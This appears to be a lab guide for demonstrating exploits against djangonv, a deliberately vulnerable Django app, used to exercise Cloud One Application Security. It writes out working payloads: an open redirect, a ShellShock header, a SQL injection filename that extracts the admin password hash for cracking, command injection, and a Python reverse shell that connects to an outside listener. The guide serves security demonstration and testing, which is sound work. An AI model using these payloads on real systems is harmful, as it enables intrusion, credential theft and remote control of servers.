# Instructions for exploiting vulnerabilities in the djangonv app

## Cloud One Application Security Policy

Before beginning, some adjustments need to be made to the Cloud One Application Security policy in order to allow some of the (poorly written) code to run:

In the Policies section of your application group, click the 'configure policy' icon that corresponds to 'Open Redirect'.

In the Open Redirect Policy Configuration, click the '+' and add a rule to allow redirections that occur naturally within the application.

For example, if you're running the application on http://127.0.0.1:8000, add a rule that looks like this:

http://127.0.0.1:8000/*

You can, then, enter text to preview the match with:

http://127.0.0.1:8000/taskManager/login
-or-
http://127.0.0.1:8000/taskManager/logout 

Also, for SQL Injection, click the 'configure policy' icon and enable the algorithms of interest.

## Exploits

### Open Redirect Vulnerability

The /taskManager/logout endpoint is susceptible to an open redirect.
Threat actors can leverage these types of vulnerabilities to redirect the user's browser to a URL of their choice.  
The typical exploit vector is via a malicious embedded link in an email.

Demonstrate the vulnerability by pasting the following into the browser's URL space:
```
http://127.0.0.1:8000/taskManager/logout?redirect=http://www.yahoo.com
```

### Malicious Payload (Intrusion Prevention)
Open a terminal window and paste in the following (ShellShock) exploit:
```
curl -H "User-Agent: () { :; }; /bin/eject" http://127.0.0.1:8000
```
Note: The application doesn't actually suffer from the ShellShock vulnerability.  But, Cloud One Application Security's Malicious Payload algorithms will pick up on the attempts.
### Remote Command Execution

To trigger a Remote Command Execution (that's actually both a RCE and SQLi..), do this:

1. Go to http://127.0.0.1:8000/ and click "Login"

2. Login to the application
```
user / user123
```
3. Click the link for the "demo project".

4. Click the "Add files" link.  

5. Pick any file from your local computer, and use the following payload for the filename:
```
'||(SELECT password FROM auth_user WHERE username='admin')||'
```
Once this exploit has succeeded, you should see the file in the project file list. The filename contains the MD5 hash of the password of the admin user (after the "md5$"). You should be able to crack this password using JTR or rainbow tables or other.

### OS Command Injection:

In the same place as in for the attack above ("My Projects" --> project you created, add files).
Also pick any file from your local computer, but for the payload use:

An innocent sleep statement (to demonstrate that we can run any command):
```
some_file_name; sleep 1m
```
You'll notice that (without Cloud One Application Security), the browser will "sleep" for 1 minute.

For a more "interesting" demonstration, you can inject a python reverse shell.  Reverse shells are commonly used to remotely control the locally exploited application.

Also in the same location within the application, pick any file from your local computer, but for the payload use:
```
some_file_name; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.64.1",8001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Note:  You'll need to set up a listener on an external host in order for this reverse shell to actually connect.  In the above case the host is at 192.168.64.1 and is listening on port 8001.

For example:
```
nc -nvlp 8001
```
Note:  netcat syntax may vary from system to system.

